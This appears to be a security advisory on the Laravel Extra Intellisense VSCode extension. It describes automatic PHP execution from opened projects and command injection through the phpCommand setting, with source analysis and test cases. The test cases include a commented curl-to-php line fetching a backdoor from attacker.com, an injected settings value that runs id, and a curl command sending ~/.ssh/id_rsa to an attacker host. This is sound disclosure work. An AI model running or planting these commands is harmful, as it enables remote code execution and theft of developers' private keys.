# Vulnerabilities in Laravel Extra Intellisense VSCode Extension

## 1. Arbitrary PHP Code Execution via Auto-loading of Laravel Projects

### Description
The VSCode extension automatically executes PHP code to retrieve Laravel project metadata (routes, models, views, etc.) when a project is opened. If a user opens a malicious Laravel project directory, PHP code within that project will automatically execute without any prompt or warning. The extension runs this code both when the project is first opened and periodically thereafter.

### Impact
High severity. An attacker can craft a malicious Laravel project that, when opened by a victim with this extension installed, will execute arbitrary PHP code on the victim's system with the permissions of the VSCode process. This could lead to data theft, system compromise, or further lateral movement.

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
- The README contains a security note warning users about the extension automatically running the Laravel application
- The extension logs commands being executed to the output channel

### Missing Mitigations
- No confirmation prompt before executing PHP code from newly opened projects
- No sandboxing of code execution
- No code signing or verification of Laravel project files
- No option to disable automatic execution for untrusted projects

### Preconditions
- The victim must have the Laravel Extra Intellisense extension installed in VSCode
- The victim must open a directory containing a malicious Laravel project in VSCode

### Source Code Analysis
The vulnerability stems from how the extension automatically executes PHP code via the `runLaravel` method in `helpers.ts`:

1. The extension periodically calls provider methods like `loadRoutes()`, `loadViews()`, etc.
2. These methods use `Helpers.runLaravel()` to execute PHP code
3. In `helpers.ts`, the `runLaravel` method constructs a PHP script that:
   - Loads the Laravel application (`require_once 'bootstrap/app.php'`)
   - Executes user-provided code within the Laravel context
   - Returns results to the extension

```typescript
static runLaravel(code: string, description: string|null = null) : Promise<string> {
  // ...
  var command =
    "define('LARAVEL_START', microtime(true));" +
    "require_once '" + Helpers.projectPath("vendor/autoload.php", true) + "';" +
    "$app = require_once '" + Helpers.projectPath("bootstrap/app.php", true) + "';" +
    // ... executes user code from the project

  return new Promise(function (resolve, error) {
    self.runPhp(command, description)
      .then(function (result: string) {
        // ... process result
      });
  });
}
```

The execution path begins in the extension's `activate` function, which initializes all providers. These providers immediately begin collecting metadata by executing PHP code from the project:

```typescript
export function activate(context: vscode.ExtensionContext) {
  // ...
  context.subscriptions.push(vscode.languages.registerCompletionItemProvider(LANGUAGES, new RouteProvider, ...));
  context.subscriptions.push(vscode.languages.registerCompletionItemProvider(LANGUAGES, new ViewProvider, ...));
  // ... other providers
}
```

### Security Test Case
1. Create a malicious Laravel project with the following code in a service provider or route file:
   ```php
   // In routes/web.php or a service provider
   file_put_contents('/tmp/vscode_laravel_extension_hacked.txt', 'System compromised via Laravel Extra Intellisense');
   // For more severe demonstration (DON'T TEST IN PRODUCTION):
   // shell_exec('curl https://attacker.com/backdoor.php | php');
   ```

2. Bundle this as a Laravel project with standard directory structure including:
   - app/ directory
   - vendor/autoload.php
   - bootstrap/app.php
   - routes/ directory

3. Send this project to a victim (e.g., via Git, ZIP file, etc.)

4. When the victim opens the project in VSCode with Laravel Extra Intellisense installed, the malicious code will execute automatically without any prompt.

5. Verify the attack by checking if `/tmp/vscode_laravel_extension_hacked.txt` was created.

## 2. Command Injection via phpCommand Configuration

### Description
The extension uses a user-configurable `phpCommand` setting to execute PHP code. This command is passed directly to Node.js's `child_process.exec()` with insufficient sanitization. While the extension attempts to escape quotation marks and some special characters, it doesn't fully sanitize the command or the code being executed, which could allow command injection.

### Impact
Critical severity. An attacker can craft malicious PHP code or manipulate the phpCommand configuration to execute arbitrary shell commands on the victim's system.

### Vulnerability Rank
High

### Currently Implemented Mitigations
- Basic escaping of double quotes and some special characters
- Additional escaping for Unix-like platforms

### Missing Mitigations
- No proper command-line argument sanitization
- Using string template replacement instead of proper argument passing
- No validation of the phpCommand configuration value
- No restrictions on the commands that can be executed

### Preconditions
- A malicious user must have access to modify the VSCode configuration or trick a user into applying a malicious configuration
- Alternatively, a malicious Laravel project could contain code that exploits edge cases in the escaping logic

### Source Code Analysis
The vulnerability exists in the `runPhp` method in `helpers.ts`:

```typescript
static async runPhp(code: string, description: string|null = null) : Promise<string> {
  code = code.replace(/\"/g, "\\\"");
  if (['linux', 'openbsd', 'sunos', 'darwin'].some(unixPlatforms => os.platform().includes(unixPlatforms))) {
    code = code.replace(/\$/g, "\\$");
    code = code.replace(/\\\\'/g, '\\\\\\\\\'');
    code = code.replace(/\\\\"/g, '\\\\\\\\\"');
  }

  let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\"";
  let command = commandTemplate.replace("{code}", code);

  // ... execute the command using cp.exec(command, ...)
}
```

The issue is that `cp.exec()` runs the command through a shell, which creates opportunity for command injection if the escaping is inadequate. The current escaping logic:
1. Replaces double quotes with escaped double quotes
2. On Unix-like platforms, escapes dollar signs and adds extra escaping for quotes

However, there are still opportunities for injection:
- The `{code}` template replacement is done using string replacement, not proper parameter passing
- If the user sets a malicious `phpCommand` template, additional commands could be injected
- The escaping logic doesn't handle all special shell characters

### Security Test Case
1. Create a custom VSCode setting in your settings.json file:
   ```json
   "LaravelExtraIntellisense.phpCommand": "php -r \"{code}\" && echo 'INJECTED COMMAND' && id"
   ```

2. Open a Laravel project with Laravel Extra Intellisense extension

3. The extension will run PHP code to collect metadata, and the injected command (`echo 'INJECTED COMMAND' && id`) will also execute

4. Check the extension output channel for evidence of the injected command execution

5. For a more sophisticated attack, a command that exfiltrates data could be used:
   ```json
   "LaravelExtraIntellisense.phpCommand": "php -r \"{code}\" && curl -d \"data=$(cat ~/.ssh/id_rsa)\" https://attacker.com/collect"
